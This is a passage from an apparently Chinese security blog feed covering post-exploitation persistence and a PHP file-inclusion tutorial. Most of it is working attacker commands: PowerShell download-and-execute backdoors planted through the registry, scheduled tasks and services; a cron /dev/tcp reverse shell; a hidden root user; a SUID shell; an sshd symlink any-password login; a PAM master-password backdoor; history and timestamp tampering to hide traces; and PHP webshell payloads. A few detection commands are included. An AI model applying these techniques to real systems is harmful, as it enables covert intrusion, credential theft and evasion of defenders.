class=\"line\">&quot;Userinit&quot;=&quot;C:\\\\Windows\\\\system32\\\\userinit.exe,C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.142:8888/logo.gif&#x27;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x02-组策略设置脚本启动\"><a class=\"markdownIt-Anchor\" href=\"#0x02-组策略设置脚本启动\">#</a> 0x02 组策略设置脚本启动</h4>\n<p>运行 gpedit.msc 进入本地组策略，通过 Windows 设置的 “脚本 (启动 / 关机)” 项来说实现。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109181141835.png\" alt=\"image-20221109181141835\"></p>\n<p>脚本名写 powershell 绝对路径，脚本参数写 web 投递后门</p>\n<h4 id=\"0x03-计划任务\"><a class=\"markdownIt-Anchor\" href=\"#0x03-计划任务\">#</a> 0x03 计划任务</h4>\n<p>通过 window 系统的任务计划程序功能实现定时启动某个任务，执行某个脚本。</p>\n<p>使用以下命令可以一键实现：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /create /sc minute /mo 1 /tn &quot;Security Script&quot; /tr &quot;powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(\\&quot;\\&quot;\\&quot;http://192.168.3.48:8080/T5uEhVubWqF\\&quot;\\&quot;\\&quot;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<p>容易遇到的问题：cmd 命令行执行单引号会被替换成双引号，故这里使用三个双引号替代。</p>\n<p>合理的日期：某月某月凌晨三点</p>\n<h4 id=\"0x04-服务自启动\"><a class=\"markdownIt-Anchor\" href=\"#0x04-服务自启动\">#</a> 0x04 服务自启动</h4>\n<p>通过服务设置自启动，结合 powershell 实现无文件后门。</p>\n<p>使用以下命令可实现：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc create &quot;KeyName&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.3.48:8080/T5uEhVubWqF&#x27;))\\&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">sc description  KeyName &quot;Just For Test&quot;   //设置服务的描述字符串</span><br><span class=\"line\">sc config Name start= auto                //设置这个服务为自动启动</span><br><span class=\"line\">net start Name                            //启动服务</span><br></pre></td></tr></table></figure>\n<p>成功创建了一个自启动服务</p>\n<p><strong>通过服务自启动上线权限为 system</strong></p>\n<h4 id=\"0x05-wmi后门\"><a class=\"markdownIt-Anchor\" href=\"#0x05-wmi后门\">#</a> 0x05 WMI 后门</h4>\n<p>在 2015 年的 blackhat 大会上 Matt Graeber 介绍了一种无文件后门就是用的 WMI。这里可以利用一个工具 powersploit，下面用它的 Persistence 模块来示范一个简单的例子。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Import-Module .\\Persistence\\Persistence.psm1</span><br><span class=\"line\">$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At &#x27;3 PM&#x27;</span><br><span class=\"line\">$UserOptions = New-UserPersistenceOption -Registry -AtLogon</span><br><span class=\"line\">Add-Persistence -FilePath .\\web.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose</span><br></pre></td></tr></table></figure>\n<h3 id=\"linux-2\"><a class=\"markdownIt-Anchor\" href=\"#linux-2\">#</a> linux</h3>\n<h4 id=\"0x00隐藏文件\"><a class=\"markdownIt-Anchor\" href=\"#0x00隐藏文件\">#</a> 0x00 隐藏文件</h4>\n<p>Linux 下创建一个隐藏文件： <code>touch  .test.txt</code></p>\n<h4 id=\"0x01隐藏文件时间戳\"><a class=\"markdownIt-Anchor\" href=\"#0x01隐藏文件时间戳\">#</a> 0x01 隐藏文件时间戳</h4>\n<p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p>\n<p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p>\n<p>touch -r index.php webshell.php</p>\n<p>或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。</p>\n<p>touch -t 1401021042.30 webshell.php</p>\n<h4 id=\"0x03-隐藏权限\"><a class=\"markdownIt-Anchor\" href=\"#0x03-隐藏权限\">#</a> 0x03 隐藏权限</h4>\n<p>在 Linux 中，使用 chattr 命令来防止 root 和其他管理用户误删除和修改重要文件及目录，此权限用 ls -l 是查看不出来的，从而达到隐藏权限的目的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chattr +i evil.php 锁定文件</span><br><span class=\"line\">lsattr  evil.php   属性查看</span><br><span class=\"line\">chattr -i evil.php 解除锁定</span><br><span class=\"line\">rm -rf 1.evil.php  删除文件</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x04隐藏历史命令\"><a class=\"markdownIt-Anchor\" href=\"#0x04隐藏历史命令\">#</a> 0x04 隐藏历史命令</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[space]set +o history</span><br><span class=\"line\">备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span><br></pre></td></tr></table></figure>\n<p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">history -d [num]</span><br></pre></td></tr></table></figure>\n<p>这种技巧是关键记录删除，或者我们可以暴力点，比如前 150 行是用户的正常操作记录，150 以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前 150 行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sed -i &#x27;150,$d&#x27; .bash_history</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x05隐藏ssh\"><a class=\"markdownIt-Anchor\" href=\"#0x05隐藏ssh\">#</a> 0x05 隐藏 ssh</h4>\n<p>#隐身登录系统，不会被 w、who、last 等指令检测到。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -T root@127.0.0.1 /bin/bash -i</span><br></pre></td></tr></table></figure>\n<p>这是因为 w 命令显示信息来源于 utmp，last 来源于 wtmp，并不是所有程序登录的时候都会调用 utmp 和 wtmp 日志记录接口，只有交互式会话，才会调用 utmp 和 wtmp 的日志记录接口，比如通过 tty 或者 pts 或者图形界面登录的都会调用 utmp 和 wtmp 日志记录接口，然后我们在使用 w 和 last 命令的时候就会发现登录信息</p>\n<p>不记录 ssh 公钥在本地.ssh 目录中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</span><br><span class=\"line\">-T 表示不分配伪终端 （正常的会话，在分配伪终端之后才会调用utmp和wtmp的日志接口）</span><br><span class=\"line\">/usr/bin/bash -i  表示在登录之后 调用bash命令</span><br><span class=\"line\">-i 表示是交互式shell</span><br></pre></td></tr></table></figure>\n<p>ssh -lroot 192.168.12.51/usr/bin/bash 其实就相当于登录之后直接调用 bash 这个名，此时系统没有为其分配 tty，不算一个完整交互式会话，只不过 bash 接受输入，然后有输出，让我们误以为是交互式会话，其实不然，你可以将 /usr/bin/bash 替换成 /usr/bin/ls 试一下，就是简单执行以下就退出了</p>\n<p>通过 ps -ef  和 lsof -i:22  仍然可以看到</p>\n<p>如果已经退出，那么可以到 secure 日志中找</p>\n<h4 id=\"0x06端口复用\"><a class=\"markdownIt-Anchor\" href=\"#0x06端口复用\">#</a> 0x06 端口复用</h4>\n<p>第二种方式：利用 IPTables 进行端口复用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 端口复用链</span><br><span class=\"line\">iptables -t nat -N LETMEIN</span><br><span class=\"line\"># 端口复用规则</span><br><span class=\"line\">iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22</span><br><span class=\"line\"># 开启开关</span><br><span class=\"line\">iptables -A INPUT -p tcp -m string --string &#x27;threathuntercoming&#x27; --algo bm -m recent --set --name letmein --rsource -j ACCEPT</span><br><span class=\"line\"># 关闭开关</span><br><span class=\"line\">iptables -A INPUT -p tcp -m string --string &#x27;threathunterleaving&#x27; --algo bm -m recent --name letmein --remove -j ACCEPT</span><br><span class=\"line\"># let&#x27;s do it</span><br><span class=\"line\">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#开启复用</span><br><span class=\"line\">echo threathuntercoming | socat - tcp:192.168.28.128:80</span><br><span class=\"line\">#ssh使用80端口进行登录</span><br><span class=\"line\">ssh -p 80 root@192.168.28.128</span><br><span class=\"line\">#关闭复用</span><br><span class=\"line\">echo threathunterleaving | socat - tcp:192.168.28.128:80</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x00添加用户\"><a class=\"markdownIt-Anchor\" href=\"#0x00添加用户\">#</a> 0x00 添加用户</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 创建一个用户名guest，密码123456的root用户</span><br><span class=\"line\">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure>\n<p>排查</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 查询特权用户特权用户(uid 为0)</span><br><span class=\"line\">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class=\"line\"># 查询可以远程登录的帐号信息</span><br><span class=\"line\">[root@localhost ~]# awk &#x27;/\\$1|\\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class=\"line\"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class=\"line\">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x01suid\"><a class=\"markdownIt-Anchor\" href=\"#0x01suid\">#</a> 0x01SUID</h4>\n<p>Suid shell 是一种可用于以拥有者权限运行的 shell。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">配合普通用户权限使用</span><br><span class=\"line\">cp /bin/bash /tmp/shell</span><br><span class=\"line\">chmod u+s /tmp/shell</span><br><span class=\"line\"></span><br><span class=\"line\">/tmp/shell</span><br><span class=\"line\">一般将其命名为find等系统命令，存在位置为/usr/bin</span><br></pre></td></tr></table></figure>\n<p>排查技巧：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 在Linux中查找SUID设置的文件</span><br><span class=\"line\">find . -perm /4000 </span><br><span class=\"line\"># 在Linux中查找使用SGID设置的文件</span><br><span class=\"line\">find . -perm /2000</span><br><span class=\"line\"># 取消s权限</span><br><span class=\"line\">chmod u-s /tmp/shell</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x02-ssh免密登录\"><a class=\"markdownIt-Anchor\" href=\"#0x02-ssh免密登录\">#</a> 0x02 ssh 免密登录</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa\t</span><br></pre></td></tr></table></figure>\n<p>再将公钥复制到.ssh 中 <code>/root/.ssh/authorized_keys</code></p>\n<h4 id=\"0x03-软连接\"><a class=\"markdownIt-Anchor\" href=\"#0x03-软连接\">#</a> 0x03 软连接</h4>\n<p>在 sshd 服务配置运行 PAM 认证的前提下，PAM 配置文件中控制标志为 sufficient 时只要 pam_rootok 模块检测 uid 为 0 即 root 权限即可成功认证登陆。通过软连接的方式，实质上 PAM 认证是通过软连接的文件名  <code>/tmp/su</code>  在 <code>/etc/pam.d/</code>  目录下寻找对应的 PAM 配置文件 (如: /etc/pam.d/su)，任意密码登陆的核心是 <code>auth sufficient pam_rootok.so</code> ，所以只要 PAM 配置文件中包含此配置即可 SSH 任意密码登陆，除了 su 中之外还有 chsh、chfn 同样可以。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</span><br></pre></td></tr></table></figure>\n<p>执行完之后，任何一台机器 <code>ssh root@IP -p 8888</code> ，输入任意密码，成功登录。</p>\n<p>排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。</p>\n<h4 id=\"0x04crontab反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#0x04crontab反弹shell\">#</a> 0x04crontab 反弹 shell</h4>\n<p>crontab 命令用于设置周期性被执行的指令。新建 shell 脚本，利用脚本进行反弹。</p>\n<p>a、创建 shell 脚本，例如在 /etc/evil.sh</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345  0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p><code>chmod +sx /etc/evil.sh</code></p>\n<p>b、crontab -e 设置定时任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#每一分钟执行一次</span><br><span class=\"line\">*/1 * * * * root /etc/evil.sh</span><br></pre></td></tr></table></figure>\n<p>重启 crond 服务， <code>service crond restart</code> ，然后就可以用 nc 接收 shell。</p>\n<h4 id=\"0x05pam后门\"><a class=\"markdownIt-Anchor\" href=\"#0x05pam后门\">#</a> 0x05pam 后门</h4>\n<p>PAM （Pluggable Authentication Modules ）是由 Sun 提出的一种认证机制。它通过提供一些动态链接库和一套统一的 API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM 最初是集成在 Solaris 中，目前已移植到其它系统中，如 Linux、SunOS、HP-UX 9.0 等。</p>\n<p>利用方法:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、获取目标系统所使用的PAM版本，下载对应版本的pam版本</span><br><span class=\"line\">2、解压缩，修改pam_unix_auth.c文件，添加万能密码</span><br><span class=\"line\">3、编译安装PAM</span><br><span class=\"line\">4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</span><br></pre></td></tr></table></figure>\n<p>排查</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 1、通过Strace跟踪ssh</span><br><span class=\"line\">ps axu | grep sshd</span><br><span class=\"line\">strace -o aa -ff -p PID</span><br><span class=\"line\">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class=\"line\"># 2、检查pam_unix.so的修改时间</span><br><span class=\"line\">stat /lib/security/pam_unix.so      #32位</span><br><span class=\"line\">stat /lib64/security/pam_unix.so    #64位</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/05/17/include/",
            "url": "http://example.com/2022/05/17/include/",
            "title": "file include",
            "date_published": "2022-05-17T05:38:45.000Z",
            "content_html": "<h1 id=\"file-include\"><a class=\"markdownIt-Anchor\" href=\"#file-include\">#</a> file include</h1>\n<blockquote>\n<p>来自 pikachu 的介绍：</p>\n<p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在 PHP 中，提供了：<br>\ninclude(),include_once()<br>\nrequire(),require_once()<br>\n 这些文件包含函数，这些函数在代码设计中被经常使用到。</p>\n<p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个 “意想不到” 的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：<br>\n**1. 本地文件包含漏洞：** 仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br>\n**2. 远程文件包含漏洞：** 能够通过 url 地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。</p>\n<p>因此，在 web 应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</p>\n</blockquote>\n<h2 id=\"php伪协议\"><a class=\"markdownIt-Anchor\" href=\"#php伪协议\">#</a> PHP 伪协议</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">\t<span class=\"keyword\">include</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure>\n<p>文件包含函数 (php):</p>\n<blockquote>\n<p>include</p>\n<p>include_once</p>\n<p>require</p>\n<p>require_one</p>\n<p>nclude 与 require 基本是相同的，除了错误处理方面:</p>\n<ul>\n<li>\n<p>include ()，只生成警告（E_WARNING），并且脚本会继续</p>\n</li>\n<li>\n<p>require ()，会生成致命错误（E_COMPILE_ERROR）并停止脚本</p>\n</li>\n<li>\n<p>include_once () 与 require ()_once ()，如果文件已包含，则不会包含，其他特性如上</p>\n</li>\n</ul>\n</blockquote>\n<p>直接包含 php，html 文件会直接执行，对于 txt 文件或者 linux 下普通文件，可以直接读取</p>\n<p>对于 php 伪协议，使用时需要注意 allow_url_open 和 allow_url_include ，有些伪协议会对此有限制，有些没有</p>\n<h4 id=\"1file协议\"><a class=\"markdownIt-Anchor\" href=\"#1file协议\">#</a> 1.file 协议</h4>\n<p>allow_url_fopen ：off/on</p>\n<p>allow_url_include：off/on</p>\n<p><code>?file=file://D:/soft/phpStudy/WWW/phpcode.txt</code></p>\n<h4 id=\"2phpfilter\"><a class=\"markdownIt-Anchor\" href=\"#2phpfilter\">#</a> 2.php://filter</h4>\n<p>读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了。</p>\n<p>allow_url_open=on/off</p>\n<p>allow_url_include=on/off</p>\n<blockquote>\n<p>?file=php://filter/read=convert.base64-encode/resource=web1.php</p>\n<p>?file=php://filter/write=convert.base64-decode/resource=web1.php</p>\n</blockquote>\n<h4 id=\"3phpinput\"><a class=\"markdownIt-Anchor\" href=\"#3phpinput\">#</a> 3.php://input</h4>\n<p>可以访问请求的原始数据的只读流，将 post 请求中的数据作为 PHP 代码执行。http 方法为 get 时并不影响 input 接收 post 参数</p>\n<p>allow_url_open=on/off</p>\n<p>allow_url_include=on</p>\n<p>当然也可以在 post 中写入一句话木马 <code>&lt;?php fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[&quot;cmd&quot;]); ?&gt;');?&gt;</code></p>\n<p>可以配合 file_get_contents 读文件或者 system 执行系统命令，或者写马</p>\n<h4 id=\"4zipbzip2-zlib\"><a class=\"markdownIt-Anchor\" href=\"#4zipbzip2-zlib\">#</a> 4.zip://,bzip2://, zlib://</h4>\n<p>allow_url_open=on/off</p>\n<p>allow_url_include=on/off</p>\n<h5 id=\"41-zip\"><a class=\"markdownIt-Anchor\" href=\"#41-zip\">#</a> 4.1 zip://</h5>\n<p><code>zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</code></p>\n<p><code>?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt</code></p>\n<p>如果网站限制，可以将后缀改为 jgp，仍可以解析</p>\n<p>需要将 #进行 url 编码</p>\n<h5 id=\"42-bzip2\"><a class=\"markdownIt-Anchor\" href=\"#42-bzip2\">#</a> 4.2 bzip2://</h5>\n<p><code>?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg</code></p>\n<h5 id=\"43-zlib\"><a class=\"markdownIt-Anchor\" href=\"#43-zlib\">#</a> 4.3 zlib://</h5>\n<p><code>?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg</code></p>\n<h4 id=\"5data\"><a class=\"markdownIt-Anchor\" href=\"#5data\">#</a> 5.data://</h4>\n<p>allow_url_open=on</p>\n<p>allow_url_include=on</p>\n<p><code>?file=data://text/plain,&lt;?php phpinfo()?&gt;</code></p>\n<p><code>?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2021/png/2476579/1628997823639-8d22e937-1e94-4abd-9e2a-e459e009be24.png?x-oss-process=image%2Fresize%2Cw_889%2Climit_0%2Fresize%2Cw_889%2Climit_0\" alt=\"img\"></p>\n<h3 id=\"一些小题目\"><a class=\"markdownIt-Anchor\" href=\"#一些小题目\">#</a> 一些小题目</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">if(stristr($file,&quot;php://filter&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class=\"line\">\texit(&#x27;hacker!&#x27;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if($file)&#123;</span><br><span class=\"line\">\tif ($file!=&quot;http://www.baidu.com&quot;) echo &quot;tips：flag在当前目录的某个文件中&quot;;</span><br><span class=\"line\">\tinclude($file);</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\techo &#x27;&lt;a href=&quot;?file=http://www.baidu.com&quot;&gt;click go baidu&lt;/a&gt;&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//file=php://input  &lt;post&gt; &lt;?php system(&#x27;dir&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">show_source(__FILE__);</span><br><span class=\"line\">include(&#x27;flag.php&#x27;);</span><br><span class=\"line\">$a= $_GET[&quot;a&quot;];</span><br><span class=\"line\">if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123;</span><br><span class=\"line\">\techo &quot;success\\n&quot;;</span><br><span class=\"line\">\techo $flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//a=php://input    &lt;post&gt; I want flag</span><br><span class=\"line\">//file_get_contents可以读取input流</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">if (!$file) echo &#x27;&lt;a href=&quot;?file=upload&quot;&gt;upload?&lt;/a&gt;&#x27;;</span><br><span class=\"line\">if(stristr($file,&quot;input&quot;)||stristr($file, &quot;filter&quot;)||stristr($file,&quot;data&quot;)/*||stristr($file,&quot;phar&quot;)*/)&#123;</span><br><span class=\"line\">\techo &quot;hack?&quot;;</span><br><span class=\"line\">\texit();</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\tinclude($file);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!-- flag在当前目录的某个文件中 --&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<h2 id=\"cgi-fast-cgiphp-fpm\"><a class=\"markdownIt-Anchor\" href=\"#cgi-fast-cgiphp-fpm\">#</a> CGI、FAST CGI，PHP FPM</h2>\n<p>CGI: 指的是 Web 服务器与 web 应用程序之间的一种数据交换协议。</p>\n<p>FastCGI: 类似于 CGI，Fast-CGI 也是一种通信协议，但是它在 CGI 的基础上，在效率上做了一些优化。只有非静态文件才会被 fastcgi 处理</p>\n<p>PHP-CGI: PHP-CGI 是 PHP 对 Web 服务器提供的 CGI 协议的接口程序，即实现了 CGI 协议的 php 解释器程序。它能解析 PHP，也能通过 CGI 与 web 服务器通信。</p>\n<p>PHP-FPM: 是 PHP 对 Web 服务器提供的 FastCGI 协议的接口程序，即在实现解释 PHP 脚本和与 web 服务器通讯的基础上，额外还提供了相对进程调度、任务管理功能。fastcgi process manager</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105160625653.png\" alt=\"image-20221105160625653\"></p>\n<p>Apache/nginx 加载 php：</p>\n<p>1. 通过 